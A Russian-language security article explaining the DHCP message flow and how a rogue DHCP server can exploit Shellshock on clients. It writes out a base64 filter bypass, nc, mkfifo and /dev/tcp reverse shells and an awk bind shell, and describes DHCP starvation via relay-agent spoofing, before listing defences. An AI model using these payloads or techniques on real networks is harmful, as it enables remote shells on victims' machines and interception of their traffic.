![LOGO](https://habrastorage.org/web/3cf/b27/403/3cfb2740364e40eb9d61c1c99f5ccf7c.png)

В данной статье мы расскажем, как эксплуатировать ShellShock на клиенте DHCP и получить на нем полноценный reverse или bind shell. Интернет пестрит [статьями](http://blog.trendmicro.com/trendlabs-security-intelligence/bash-bug-saga-continues-shellshock-exploit-via-dhcp/), повествующими о возможностях эксплуатации shellshock на DHCP-клиентах. Есть даже [статьи](http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell) о том, как получить reverse shell на DHCP-клиенте. Однако, стабильно и повсеместно работающего инструмента для получения shell мы еще не встречали. Те, кто в теме, возможно, нового здесь не увидят, но не исключено, что вам будет интересно узнать, как нам удалось автоматизировать получение reverse и bind shell в условиях фильтрации и экранирования символов на стороне DHCP-клиента. Кроме того, мы расскажем и о том, чем вообще может быть интересен протокол DHCP.<cut/>

Протокол DHCP применяется для автоматического назначения IP-адреса, шлюза по умолчанию, DNS-сервера и т.д. В качестве транспорта данный протокол использует UDP, а это значит, что мы можем без особых проблем подменять все интересующие нас поля в сетевом пакете, начиная с канального уровня: MAC-адрес источника, IP-адрес источника, порты источника - то есть все, что нам хочется.

## Работает DHCP, ~~в двух словах~~, примерно так:

1. **DHCPDISCOVER** Клиент отправляет широковещательный сетевой пакет с целью найти DHCP-сервер в сети, при этом с канальным уровнем все понятно и о нем писать дальше не будем, сетевой — исходя из собственного опыта, здесь может быть всякое - зависит от клиента, но должно быть:<br /><br />
```SRC IP: 0.0.0.0, DST IP: 255.255.255.255.```
На транспортном уровне все запросы отправляются так: 
```SRC PORT: 68, DST PORT: 67```
Соответственно, когда сервер отвечает клиенту: 
```SRC PORT: 67, DST PORT: 68```<br /><br />
Контрольную сумму UDP можно не считать. Мы не встречали ни одного DHCP-сервера, который бы ее проверял, да и сетевое оборудование пропускает пакеты с нулевым значением UDP checksum без проблем. В первом байте прикладного уровня (поле op - тип сообщения) клиент выставляет значение - **0х01** (BOOTREQUEST - запрос от клиента к серверу). На остальных полях пакета не будем останавливаться, поскольку их описание, длина и значения есть в [RFC](https://tools.ietf.org/html/rfc2131) и в [WIKI](https://ru.wikipedia.org/wiki/DHCP). В запросе от клиента нам также интересно поле **xid** (Transaction ID - рандомное число размером 4 байта по смещению 0х04 от начала прикладного уровня в пакете). Если сервер в ответе выставит поле **xid** не равным xid клиента, то клиент отбросит ответ от сервера, поскольку посчитает, что этот ответ в другой транзакции. Остановимся на DHCP-опциях пакета. Всего их 256, а полный список можно найти [здесь](https://www.iana.org/assignments/bootp-dhcp-parameters/bootp-dhcp-parameters.xhtml) или [тут](http://www.networksorcery.com/enp/protocol/bootp/options.htm). Клиент обязательно выставляет опцию с кодом **53** ([DHCP message type](https://tools.ietf.org/html/rfc2132#section-9.6) тип DHCP сообщения) равной **0х01**, это значит, что данный пакет предназначен для нахождения DHCP-сервера, и опцию **55** ([Parameter Request List](https://tools.ietf.org/html/rfc2132#section-9.8) список запрашиваемых у сервера параметров, например адрес шлюза, маска подсети, DNS-серверы и т.д.).<br /><br />
Вот так выглядит этот запрос в WireShark:<br /><br />
![DHCPDISCOVER](https://habrastorage.org/web/18e/d39/814/18ed398147f543b7b49f766be20c8202.png)

2. **DHCPOFFER** Сервер получает запрос от клиента и отправляет ему предложение. На сетевом уровне в качестве SRC IP сервер выставляет свой IP-адрес, в DST IP должно быть: 255.255.255.255, но это не всегда так. В DST IP также может быть выставлен IP-адрес, выделенный клиенту, или IP-адрес ретранслятора, если тот участвует в процессе. Вы спросите, а как же пакет доходит до клиента, если у него еще нет IP-адреса? Все просто: в DHCPDISCOVER- и DHCPREQUEST-запросах, в поле **chaddr** (Сlient MAC address) клиент указывает свой MAC-адрес. <br /><br />Таким образом, сервер или ретранслятор знают, куда доставлять пакет на канальном уровне, поскольку сервер или ретранслятор всегда находятся в пределах одного [широковещательного домена](https://ru.wikipedia.org/wiki/Широковещательный_домен) с клиентом, а что происходит на сетевом уровне, не так уж и важно ~~UDP магия~~. В типе сообщения значение **0х02** (BOOTREPLY - ответ сервера клиенту). В поле **xid** выставляется значение, равное значению поля xid в запросе клиента. В поле **yiaddr** (Your (client) IP address) выставляется IP-адрес клиента, предложенный сервером. Что появляется в DHCP-опциях: в опции с кодом 53 ([DHCP message type](https://tools.ietf.org/html/rfc2132#section-9.6)) значение — 0х02 (DHCPOFFER), код 51 ([IP Address Lease Time](https://tools.ietf.org/html/rfc2132#section-9.2)) — время аренды IP-адреса, код 54 ([Server Identifier](https://tools.ietf.org/html/rfc2132#section-9.7)) — IP-адрес DHCP-сервера. Все остальные опции предложения зависят от того, какие параметры запросил клиент, их список клиент указал в DHCPDISCOVER-запросе в опции с кодом 55 ([Parameter Request List](https://tools.ietf.org/html/rfc2132#section-9.8)). <br /><br />
![DHCPOFFER](https://habrastorage.org/web/5d3/982/b66/5d3982b668b34b93a945c4949ecf2d81.png)

3. **DHCPREQUEST** Клиент отправляет серверу запрос на получение сетевых параметров. На сетевом уровне должно быть так: ```SRC IP: 0.0.0.0 DST IP: 255.255.255.255``` но может быть и так: в SRC IP выставляется IP-адрес, который назначил сервер в своем предложении (поле **yiaddr**), а в DST IP выставляется IP-адрес, который расположен в опции предложения сервера с кодом 54 ([Server Identifier](https://tools.ietf.org/html/rfc2132#section-9.7)). DHCP-опции в этом запросе не отличаются от DHCPDISCOVER-запроса, за исключением опции с кодом 53 ([DHCP message type](https://tools.ietf.org/html/rfc2132#section-9.6) тип DHCP сообщения), равной **0х03** - это значит, что данный пакет предназначен для запроса параметров от DHCP-сервера. И еще клиент добавляет в запрос опцию с кодом 54 ([Server Identifier](https://tools.ietf.org/html/rfc2132#section-9.7)), поскольку уже знает IP-адрес сервера, а также опцию с кодом 50 ([Requested IP address](https://tools.ietf.org/html/rfc2132#section-9.1)). Кроме того, клиент может выставить опцию 12([Host Name Option](https://tools.ietf.org/html/rfc2132#section-3.14) свое имя хоста) и т.п.<br /><br />
![DHCPREQUEST](https://habrastorage.org/web/33c/75f/074/33c75f074b984caa99f4ae3fc97f7dd4.png)

4. **DHCPACK** Сервер отправляет клиенту подтверждение. На сетевом уровне должно быть так: ```SRC IP: <IP-адрес сервера> DST IP: 255.255.255.255```. Опции и поля этого пакета не отличаются от DHCPOFFER, за исключением опции с кодом 53 ([DHCP message type](https://tools.ietf.org/html/rfc2132#section-9.6) тип DHCP-сообщения), равной **0х05** - это значит, что данный пакет — подтверждение от DHCP-сервера.<br /><br />
![DHCPACK](https://habrastorage.org/web/470/d4f/e1f/470d4fe1f38c4722bbce2dab4cdd4197.png)

Далее, клиент с помощью протокола **ARP** пытается обнаружить конфликт IP-адресов в локальной сети ([Address Conflict Detection](https://tools.ietf.org/html/rfc5227)). Если конфликт не найден, клиент выставляет полученные из DHCPACK параметры сетевому интерфейсу. Если  обнаружен, клиент рассылает широковещательное сообщение отказа DHCP **DHCPDECLINE**, после чего процедура получения IP-адреса повторяется.

Также у протокола DHCP есть еще одна особенность: если клиент ранее отправлял запрос **DHCPDISCOVER**, то при повторном подключении к той же сети клиент сразу отправляет **DHCPREQUEST**; при этом в DHCP-опции с кодом 50 ([Requested IP address](https://tools.ietf.org/html/rfc2132#section-9.1)) выставляется IP-адрес, полученый ранее.

Остановимся на упомянутом **DHCPDECLINE** подробнее. На практике это выглядит так:

1. Клиент отправляет **DHCPREQUEST**, поскольку уже подключался к этой сети. ```Transaction ID: 0x825b824a; Requested IP: 192.168.1.171; Client MAC address: 08:00:27:ce:7a:64```<br /><br />
![DHCPREQUEST before DHCPDECLINE](https://habrastorage.org/web/dde/934/1fb/dde9341fb7d14a618d44d4837d8e7f94.png)

2. Сервер отвечает **DHCPACK**.
```Transaction ID: 0x825b824a; yiaddr: 192.168.1.171; siaddr: 192.168.1.1; router: 192.168.1.1```
![DHCPACK before DHCPDECLINE]<br /><br />(https://habrastorage.org/web/348/948/488/3489484884ca425fb11d915ae7c86b95.png)

3. Клиент с помощью протокола **ARP** узнает MAC-адрес шлюза, а далее, через тот же **ARP**, пытается обнаружить конфликт IP-адресов в локальной сети ([Address Conflict Detection](https://tools.ietf.org/html/rfc5227)). Запрос выглядит так:<br /><br />
```sender mac: 08:00:27:ce:7a:64; sender ip: 0.0.0.0; target mac: 00:00:00:00:00:00; target ip: 192.168.1.171```<br /><br />
![Address conflict detection](https://habrastorage.org/web/f3c/b43/6c4/f3cb436c405c41dbbaf3eb248025e9d7.png)

4. Хост с IP-адресом **192.168.1.171** отвечает на ARP-запрос.<br /><br />
![ARP reply](https://habrastorage.org/web/f0d/136/5fc/f0d1365fc0ed476c8e14849e09f31467.png)

5. Клиент выявил конфликт IP-адресов в сети и отправляет широковещательный **DHCPDECLINE**.<br /><br />
```Transaction ID: 0x825b824a; Requested IP: 192.168.1.171; ciaddr: 192.168.1.171```<br /><br />
![DHCPDECLINE](https://habrastorage.org/web/1db/9be/144/1db9be1449fb43228d56d60e0def8198.png)

6. Процедура получения IP-адреса повторяется, но уже с другим Transaction ID: **0x713a0fe7**. Вы обратили внимание на пакеты с номерами 89, 101, 106, 136 и 151? Если да, то наверняка поняли, что на этот раз сервер выделил клиенту IP-адрес **192.168.1.172** и перед этим DHCP-сервер сам с помощью того же **ARP** (пакеты с номерами 89, 101, 106:  ```Who has 192.168.1.172? Tell 192.168.1.1```) убедился, что IP-адрес **192.168.1.172** свободен, и только потом отправил **DHCPOFFER**. После этого клиент еще раз попытался выявить конфликт IP-адресов (пакеты с номерами 136, 151:  ```Who has 192.168.1.172? Tell 0.0.0.0```).<br /><br />
![Retrieving IP address again](https://habrastorage.org/web/e21/68a/f4c/e2168af4cc2e473d8dd2a23ee7305f59.png)

Мы уже знаем, что клиент, подключившись хотя бы раз к сети, будет отправлять только DHCPREQUEST-запрос, выставляя при этом в Requested IP адрес, который получил ранее. Но что если DHCP-сервер уже выделил этот IP-адрес, поменялась конфигурация или адресация, и сервер не может дать клиенту этот адрес? Для этого существует тип сообщения **DHCPNAK**. Работает он следующим образом:

1. Клиент отправляет **DHCPREQUEST**.
```Transaction ID: 0xa7ddc5cb; Requested IP: 192.168.1.14```<br /><br />
![DHCPREQUEST before DHCPNAK](https://habrastorage.org/web/dd9/6c0/82a/dd96c082abde48728ee3d9aa1d648f11.png)

2. В настройках сервера указан диапазон, в котором он может выделять IP-адрес, но тот, который запросил клиент, не входит в данный диапазон, поэтому сервер отправляет **DHCPNAK**.
```Transaction ID: 0xa7ddc5cb; Message: address not available```<br /><br />
![DHCPNAK](https://habrastorage.org/web/2bc/84c/e14/2bc84ce1488b40f4a99ce06de0decf4f.png)

3. Процедура получения IP-адреса повторяется, но уже с другим Transaction ID: **0xcfbf77a9**.<br /><br />
![Retrieving IP address again](https://habrastorage.org/web/2ae/c9f/f7f/2aec9ff7f5a04915a7edd4830217da35.png)

## Перейдем к shellshock

Про то, как и почему работает shellshock, писать нет никакого смысла, ведь эта уязвимость - одна из самых популярных, и о ней есть великое множество статей. Лучше остановимся на моменте, как получить shell на клиенте DHCP, в случае, если мы выступим в роли DHCP-сервера.

### В какие поля и опции можно инъектировать?
**Ответ:** практически в любые! Вот список кодов DHCP-опций, в которые возможно инъектировать (проверено на NetworkManager из состава CentOS 6.5): [14](https://tools.ietf.org/html/rfc2132#section-3.16), [18](https://tools.ietf.org/html/rfc2132#section-3.20), [43](https://tools.ietf.org/html/rfc2132#section-8.4), [56](https://tools.ietf.org/html/rfc2132#section-9.9), [60](https://tools.ietf.org/html/rfc2132#section-9.13), [61](https://tools.ietf.org/html/rfc2132#section-9.14), [62](https://tools.ietf.org/html/rfc2242#section-2), [63](https://tools.ietf.org/html/rfc2242#section-3), [64](https://tools.ietf.org/html/rfc2132#section-8.11), [66](https://tools.ietf.org/html/rfc2132#section-9.4), [67](https://tools.ietf.org/html/rfc2132#section-9.5), [77](https://tools.ietf.org/html/rfc3004#section-4), [80](https://tools.ietf.org/html/rfc4039#section-4), [82](https://tools.ietf.org/html/rfc3046#section-2.0), [83](https://tools.ietf.org/html/rfc4174#section-2), [84](https://tools.ietf.org/html/rfc3679#section-2.2), [86](https://tools.ietf.org/html/rfc2241#section-3), [87](https://tools.ietf.org/html/rfc2241#section-4), [90](https://tools.ietf.org/html/rfc3118#section-2), [94](https://tools.ietf.org/html/rfc4578#section-2.2), [95](https://tools.ietf.org/html/rfc3679#section-3.2.1), [96](https://tools.ietf.org/html/rfc3679#section-2.7), [97](https://tools.ietf.org/html/rfc4578#section-2.3), [98](https://tools.ietf.org/html/rfc2485), [99](https://tools.ietf.org/html/rfc4776#section-3.1), [100](https://tools.ietf.org/html/rfc4833#section-2), [101](https://tools.ietf.org/html/rfc4833#section-2), [102](https://tools.ietf.org/html/rfc3679#section-4), [103](https://tools.ietf.org/html/rfc3679#section-4), [104](https://tools.ietf.org/html/rfc3679#section-4), [105](https://tools.ietf.org/html/rfc3679#section-4), [106](https://tools.ietf.org/html/rfc3679#section-4), [107](https://tools.ietf.org/html/rfc3679#section-4), [108](https://tools.ietf.org/html/rfc3679#section-2.10), [109](https://tools.ietf.org/html/rfc3679#section-4), [110](https://tools.ietf.org/html/rfc3679#section-2.11), [111](https://tools.ietf.org/html/rfc3679#section-4), [113](https://tools.ietf.org/html/rfc3679#section-3.2.2), [114](https://tools.ietf.org/html/rfc3679#section-3.2.3), [115](https://tools.ietf.org/html/rfc3679#section-2.12), [116](https://tools.ietf.org/html/rfc2563#section-2), [117](https://tools.ietf.org/html/rfc2937), [120](https://tools.ietf.org/html/rfc3361#section-3.1), [122](https://tools.ietf.org/html/rfc3495#section-4), [123](https://tools.ietf.org/html/rfc6225#section-2.2.1), [124](https://tools.ietf.org/html/rfc3925#section-3), [125](https://tools.ietf.org/html/rfc3925#section-4), [126](https://tools.ietf.org/html/rfc3679#section-3.3), [127](https://tools.ietf.org/html/rfc3679#section-3.3), [128](https://tools.ietf.org/html/rfc4578#section-2.4), [129](https://tools.ietf.org/html/rfc4578#section-2.4), [130](https://tools.ietf.org/html/rfc4578#section-2.4), [131](https://tools.ietf.org/html/rfc4578#section-2.4), [132](https://tools.ietf.org/html/rfc4578#section-2.4), [133](https://tools.ietf.org/html/rfc4578#section-2.4), [134](https://tools.ietf.org/html/rfc4578#section-2.4), [135](https://tools.ietf.org/html/rfc4578#section-2.4), [136](https://tools.ietf.org/html/rfc5192#section-4), [137](https://tools.ietf.org/html/rfc5223#section-4), [138](https://tools.ietf.org/html/rfc5417#section-2), [139](https://tools.ietf.org/html/rfc5678#section-2), [140](https://tools.ietf.org/html/rfc5678#section-3), [141](https://tools.ietf.org/html/rfc6011#section-4.1), [142](https://tools.ietf.org/html/rfc6153#section-2), [143](https://tools.ietf.org/html/rfc6153#section-3), [144](https://tools.ietf.org/html/rfc6225#section-2.2.2), [145](https://tools.ietf.org/html/rfc6704#section-3.1.1), [146](https://tools.ietf.org/html/rfc6731#section-4.3), [147](https://tools.ietf.org/html/rfc3942), [148](https://tools.ietf.org/html/rfc3942), [149](https://tools.ietf.org/html/rfc3942), [150](https://tools.ietf.org/html/rfc5859#section-3), [151](https://tools.ietf.org/html/rfc6926#section-6.2.2), [152](https://tools.ietf.org/html/rfc6926#section-6.2.3), [153](https://tools.ietf.org/html/rfc6926#section-6.2.4), [154](https://tools.ietf.org/html/rfc6926#section-6.2.5), [155](https://tools.ietf.org/html/rfc6926#section-6.2.6), [156](https://tools.ietf.org/html/rfc6926#section-6.2.7), [157](https://tools.ietf.org/html/rfc6926#section-6.2.8), [158](https://tools.ietf.org/html/rfc7291#section-4), [159](https://tools.ietf.org/html/rfc7618#section-9), [160](https://tools.ietf.org/html/rfc7710#section-2.1), [161](https://datatracker.ietf.org/doc/draft-ietf-opsawg-mud/?include_text=1), [162](https://tools.ietf.org/html/rfc3942), [163](https://tools.ietf.org/html/rfc3942), [164](https://tools.ietf.org/html/rfc3942), [165](https://tools.ietf.org/html/rfc3942), [166](https://tools.ietf.org/html/rfc3942), [167](https://tools.ietf.org/html/rfc3942), [168](https://tools.ietf.org/html/rfc3942), [169](https://tools.ietf.org/html/rfc3942), [170](https://tools.ietf.org/html/rfc3942), [171](https://tools.ietf.org/html/rfc3942), [172](https://tools.ietf.org/html/rfc3942), [173](https://tools.ietf.org/html/rfc3942), [174](https://tools.ietf.org/html/rfc3942), [175](https://tools.ietf.org/html/rfc3942), [176](https://tools.ietf.org/html/rfc3942), [177](https://tools.ietf.org/html/rfc3942), [178](https://tools.ietf.org/html/rfc3942), [179](https://tools.ietf.org/html/rfc3942), [180](https://tools.ietf.org/html/rfc3942), [181](https://tools.ietf.org/html/rfc3942), [182](https://tools.ietf.org/html/rfc3942), [183](https://tools.ietf.org/html/rfc3942), [184](https://tools.ietf.org/html/rfc3942), [185](https://tools.ietf.org/html/rfc3942), [186](https://tools.ietf.org/html/rfc3942), [187](https://tools.ietf.org/html/rfc3942), [188](https://tools.ietf.org/html/rfc3942), [189](https://tools.ietf.org/html/rfc3942), [190](https://tools.ietf.org/html/rfc3942), [191](https://tools.ietf.org/html/rfc3942), [192](https://tools.ietf.org/html/rfc3942), [193](https://tools.ietf.org/html/rfc3942), [194](https://tools.ietf.org/html/rfc3942), [195](https://tools.ietf.org/html/rfc3942), [196](https://tools.ietf.org/html/rfc3942), [198](https://tools.ietf.org/html/rfc3942), [199](https://tools.ietf.org/html/rfc3942), [200](https://tools.ietf.org/html/rfc3942), [201](https://tools.ietf.org/html/rfc3942), [202](https://tools.ietf.org/html/rfc3942), [203](https://tools.ietf.org/html/rfc3942), [204](https://tools.ietf.org/html/rfc3942), [205](https://tools.ietf.org/html/rfc3942), [206](https://tools.ietf.org/html/rfc3942), [207](https://tools.ietf.org/html/rfc3942), [208](https://tools.ietf.org/html/rfc5071), [209](https://tools.ietf.org/html/rfc5071), [210](https://tools.ietf.org/html/rfc5071), [211](https://tools.ietf.org/html/rfc5071), [212](https://tools.ietf.org/html/rfc5969#section-7.1.1), [213](https://tools.ietf.org/html/rfc5986#section-3.2), 214, 215, 216, 217, 218, 219, [220](https://tools.ietf.org/html/rfc6656#section-3), [221](https://tools.ietf.org/html/rfc6607#section-3.1), [222](https://tools.ietf.org/html/rfc3942), [223](https://tools.ietf.org/html/rfc3942), 224, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 250, 251, 253.

В нашем PoC мы будем использовать DHCP-опцию с кодом 114 ([URL](https://tools.ietf.org/html/rfc3679#section-3.2.3)). Почему? Потому, что ее длина - вариативна (максимальная длина — 256 байт), а также потому, что ее [все](https://xakep.ru/2014/09/26/shellshock-dhcp/) используют. Ее описание еще есть [здесь](https://teamwork.gigaset.com/gigawiki/display/GPPPO/DHCP+option+114). Существует даже [статья](https://news.ycombinator.com/item?id=8372040) о том, как с помощью этой опции обновить уязвимые к shellshock системы :)

### Какие у нас ограничения?
**Ответ:** их много, слишком много!
1. Длина — 256 байт
2. Возможно использовать только команды интерпретатора
3. Большое ограничение на используемые символы: некоторые фильтруются, некоторые экранируются. Это зависит от клиента DHCP. Вот набор символов, которые не везде получится использовать: ```"';&|```
4. После выполнения команды, IPv4-адрес может не присвоиться, в таком случае возможно использовать IPv6 link-local-адрес, если на интерфейсе не включено игнорирование IPv6
5. Необходимо использовать абсолютные пути, иначе команда может не выполниться

### И что тогда делать?
**Ответ:** обходить ограничения!
Для обхода фильтра мы должны выполнить все одной командой. Сделаем это так: 

```bash
/bin/sh <(/usr/bin/base64 -d <<< Base64String)
```

Здесь на вход интерпретатора **/bin/sh** мы подаем вывод **/usr/bin/base64**, которая декодирует строку **Base64String**. Таким образом, мы использовали уже 34 байта, длина Base64String не должна превышать **222** байтов.

А что будет в Base64String? Не забываем про четвертое ограничение, поэтому в первую очередь выставим IP-адрес интерфейсу командой:

```bash
/bin/ip addr add <IP>/<MASK> dev eth0;
```

Эта команда накладывает на нас еще одно ограничение: мы должны знать имя интерфейса, которому выставляем IP-адрес. По умолчанию, в старых версиях Linux, на которых еще есть shellshock, первый сетевой интерфейс называется **eth0**, так что ориентируемся на него. Еще в эту строку мы должны поместить reverse shell или bind shell.

Для reverse shell будем использовать [стандартный shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) с использованием nc:

```bash
nc -e /bin/sh <IP> <PORT> 2>&1 &
rm /tmp/f 2>/dev/null;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP> <PORT> >/tmp/f &
```

Для reverse shell также можно использовать команду [отсюда](http://www.fantaghost.com/exploiting-shellshock-getting-reverse-shell):

```bash
/bin/bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Для bind shell будем использовать **/cmd/unix/bind_awk** из состава **Metasploit**, как один из наиболее коротких:

```bash
awk 'BEGIN{s="/inet/tcp/<PORT>/0/0";for(;s|&getline c;close(c))while(c|getline)print|&s;close(s)}' &
```

### [PoC](https://github.com/Vladimir-Ivanov-Git/raw-packet)

### Видео:

[![CentOS 6.5](http://img.youtube.com/vi/-B_U9f_Uofk/0.jpg)](http://www.youtube.com/watch?v=-B_U9f_Uofk "DHCP shellshock on CentOS 6.5")

[![Debian 7.5.0](http://img.youtube.com/vi/u-GXXyQnSVg/0.jpg)](http://www.youtube.com/watch?v=u-GXXyQnSVg "DHCP shellshock on Debian 7.5.0")

[![Ubuntu 14.04](http://img.youtube.com/vi/a6gijZr7Ux0/0.jpg)](http://www.youtube.com/watch?v=a6gijZr7Ux0 "DHCP shellshock on Ubuntu 14.04")

## Еще ~~немного~~ про DHCP

Ни в коем случае DHCP нельзя рассматривать исключительно как метод получения **RCE** на клиентах, потому что, во-первых, мы должны ответить быстрее реального DHCP-сервера в сети, и, во-вторых, на клиенте должен быть shellshock, а это маловероятно. Протокол DHCP в первую очередь необходимо рассматривать как метод осуществления **MITM**.

Поговорим о том, как ответить на любой запрос быстрее DHCP-сервера. Самый очевидный вариант — быть ближе к клиенту по расположению в сети, и еще наше железо и алгоритм должны работать быстрее. Однако, в большинстве случаев это не так.

Есть второй вариант: нужно нагрузить сервер, но при этом не занимать новые IP-адреса в сети, чтобы не исчерпать весь пул свободных адресов (такая атака называется DHCP starvation). Как вы уже поняли, необходимо отправлять большое количество запросов **DHCPDISCOVER**, поскольку сервер должен обработать каждый из них и отправить в ответ **DHCPOFFER**. Однако, в рамках данной транзакции **DHCPREQUEST** мы отправлять не будем, поэтому сервер будет его ждать. IP-адрес не будет считаться выделенным, потому что процедура получения IP не завершена.

Давайте посмотрим, как это выглядит на практике.

Графы нагрузки и процессы до отправки DHCPDISCOVER-запросов:

![Before load test realtime graphs](https://habrastorage.org/web/79a/809/4fa/79a8094fa7d641f08c325bd625b87b26.png)

![Before load test processes](https://habrastorage.org/web/803/0a8/c87/8030a8c87e8c4fce911fd3793ce4ddd7.png)

На рисунках видно, что load average роутера колеблется от 0.1 до 0.3, и процесс dnsmasq занимает 0% CPU. 

Графы нагрузки, процессы и список DHCP-клиентов во время отправки DHCPDISCOVER-запросов:

![During load test realtime graphs](https://habrastorage.org/web/bce/10e/188/bce10e1885584c88853990b56ecc231c.png)

![During load test processes](https://habrastorage.org/web/473/fb3/a71/473fb3a71dba4be5900515b28fb7e7fa.png)

![During load test DHPC clients](https://habrastorage.org/web/f70/994/b1d/f70994b1d9614b9f9097c879084c7065.png)

Load average роутера повысился до 1.96, и он уже не успевает отвечать на все запросы DHCPDISCOVER, процесс dnsmasq занимает целых 64% CPU, но при этом в списке DHCP клиентов только наш хост.

В результате, мы и сервер немного нагрузили, и IP-адреса не заняли. Если мы отфильтруем все сгенерированные нами же запросы DHCPDISCOVER, вероятнось того, что мы ответим быстрее реального DHCP-сервера, значительно увеличится. Задача выполнена, идем дальше.

Теперь поговорим о [типах DHCP сообщений](https://tools.ietf.org/html/rfc2132#section-9.6):

 Value | Message_Type 
 ----- | ------------ 
 1 | DHCPDISCOVER 
 2 | DHCPOFFER 
 3 | DHCPREQUEST 
 4 | DHCPDECLINE 
 5 | DHCPACK 
 6 | DHCPNAK 
 7 | DHCPRELEASE 
 8 | DHCPINFORM 


Первые шесть типов сообщений мы уже разобрали, осталось всего два: седьмой (DHCPRELEASE) и восьмой (DHCPINFORM). Остановимся на них подробнее.

Клиент может явным образом прекратить аренду IP-адреса. Для этого он отправляет сообщение освобождения аренды адреса **DHCPRELEASE** тому серверу, который предоставил адрес ранее. В отличие от других сообщений, это не рассылается широковещательно.

Сообщение информации **DHCPINFORM** предназначено для определения дополнительных сетевых параметров теми клиентами, у которых IP-адрес настроен вручную. Исходя из своего опыта, можем сказать, что такие сообщения отправляют только Windows хосты :( . Сервер отвечает на подобный запрос **DHCPACK** без выделения IP-адреса. Для этих сообщений существует свой [проект rfc](https://tools.ietf.org/html/draft-ietf-dhc-dhcpinform-clarify-06). Вы уже поняли, что мы можем выставить в DHCPACK свой шлюз, DNS, и т.д. Главное - ответить раньше реального DHCP сервера, а эта проблема уже решена выше.

## DHCP starvation & DHCP relay agent

В данной статье мы упоминали про атаку DHCP starvation - исчерпание пула свободных IP-адресов. Бытует [мнение](https://github.com/hatRiot/zarp/blob/master/src/modules/dos/dhcp_starvation.py), что провести данную атаку возможно, отправляя лишь большое количество **DHCPDISCOVER** или **DHCPREQUEST** запросов с рандомных MAC-адресов, и тогда на каждый такой запрос DHCP-сервер выделит и зарезервирует IP-адрес, но это не всегда так. Как мы уже знаем, процедура получения и резервирования IP-адреса заканчивается тогда, когда DHCP-сервер отправляет сообщение **DHCPACK**. Наиболее корректно производить данную атаку, представляясь как **DHCP relay agent**.

Приведем пример:

1. Наш сетевой интерфейс **enp0s3** с MAC-адресом: **08:00:27:6a:82:5f** и IP-адресом: **192.168.1.2**. В качестве DHCP-сервера будет выступать **Dnsmasq/2.73** из состава **OpenWrt Chaos Calmer 15.05.1** IP-адрес: **192.168.1.1**<br /><br />
![Before send](https://habrastorage.org/web/4a8/e90/d43/4a8e90d430434db0b20d95dd5304d224.png)
<br /><br />![DHCP relay script help](https://habrastorage.org/web/4a6/1c3/772/4a61c37726fe4dd3b8e00a877fb92b9e.png)

2. Начинаем отправку запросов:<br /><br />
![Send DHCP requests 1](https://habrastorage.org/web/3ad/57e/f9a/3ad57ef9a75545d39d5b5a0ed5869d76.png)<br /><br />
![Send DHCP requests 2](https://habrastorage.org/web/d0a/d1c/ed5/d0ad1ced598b4b32b6862f556d81441e.png)

Таким образом, мы забъем весь пул свободных IP-адресов, а легитимный DHCP-клиент сможет получить IP-адрес от этого DHCP-сервера только через **12 часов**. Пока легитимный DHCP-сервер не может отправить ответы клиентам, это можем сделать мы!

Как это работает:

1. Формируем и отправляем широковещательный DHCPDISCOVER-запрос, при этом представлемся как DHCP relay agent. В поле **giaddr** (Relay agent IP) указываем свой IP-адрес **192.168.1.2**, в поле **chaddr** (Client MAC address) - рандомный MAC **00:19:bb:f5:e7:a8**, при этом на канальном уровне в SRC MAC выставляем свой MAC-адрес.<br /><br />
![DHCPDISCOVER](https://habrastorage.org/web/0f1/7cf/1db/0f17cf1dbfb44b1e9e841a253711ec63.png)

2. Сервер отвечает сообщением DHCPOFFER агенту ретрансляции (нам), и предлагает клиенту с MAC-адресом **00:19:bb:f5:e7:a8** IP-адрес **192.168.1.232**<br /><br />
![DHCPOFFER](https://habrastorage.org/web/991/a1d/01f/991a1d01f08b4e2d8eb9201bdcc0ea01.png)

3. После получения DHCPOFFER, отправляем широковещательный DHCPREQUEST-запрос, при этом в DHCP-опции с кодом 50 ([Requested IP address](https://tools.ietf.org/html/rfc2132#section-9.1)) выставляем предложеный клиенту IP-адрес **192.168.1.232**, в опции с кодом 12 ([Host Name Option](https://tools.ietf.org/html/rfc2132#section-3.14)) - рандомную строку. **Важно:** значения полей **xid** (Transaction ID) и **chaddr** (Client MAC address) в DHCPREQUEST и DHCPDISCOVER должны быть одинаковыми, иначе сервер отбросит запрос, ведь это будет выглядеть, как другая транзакция от того же клиента, либо другой клиент с той же транзакцией.<br /><br />
![DHCPREQUEST](https://habrastorage.org/web/f64/9f9/f6a/f649f9f6a7e44936997b618f09bd5225.png)

4. Сервер отправляет агенту ретрансляции сообщение DHCPACK. С этого момента IP-адрес **192.168.1.232** считается зарезервированным за клиентом с MAC-адресом **00:19:bb:f5:e7:a8** на 12 часов (время аренды по умолчанию).<br /><br />
![DHCPACK](https://habrastorage.org/web/07d/cb9/341/07dcb93413d24665a7e3ca884a3ef6e7.png)

## Выводы
Способы противодействия:

1. [DHCP snooping](http://xgu.ru/wiki/DHCP_snooping) — функция коммутатора, предназначенная для защиты от атак с использованием протокола DHCP. Например, атаки с подменой DHCP-сервера в сети;

2. [Port security](http://xgu.ru/wiki/Port_security) — функция коммутатора, позволяющая указать MAC-адреса хостов, которым разрешено передавать данные через порт. После этого порт не передает пакеты, если MAC-адрес отправителя не указан как разрешенный;

3. Настройка сетевого оборудования с целью ограничения количества DHCPDISCOVER и DHCPREQUEST запросов с одного MAC-адреса и/или IP-адреса;

4. Запись и анализ трафика в сети для отслеживания аномалий. Например, обычное количество DHCP-запросов в вашей сети не превышает 100-200 в день, а во время атаки DHCP starvation их число увеличивается многократно. Еще один пример: обычно в вашей сети количество DHCP-ответов не превышает количества DHCP-запросов, а теперь количество DHCP-ответов стало вдвое больше DHCP-запросов. Это значит, что кто-то производит атаку с подменой DHCP-сервера;

5. Использование [IDS](https://ru.wikipedia.org/wiki/Система_обнаружения_вторжений), [IPS](https://ru.wikipedia.org/wiki/Система_предотвращения_вторжений), [SIEM](https://ru.wikipedia.org/wiki/SIEM) и систем мониторинга оборудования типа [Zabbix](https://ru.wikipedia.org/wiki/Zabbix);

6. По возможности использовать статическую привязку MAC - IP на DHCP сервере;

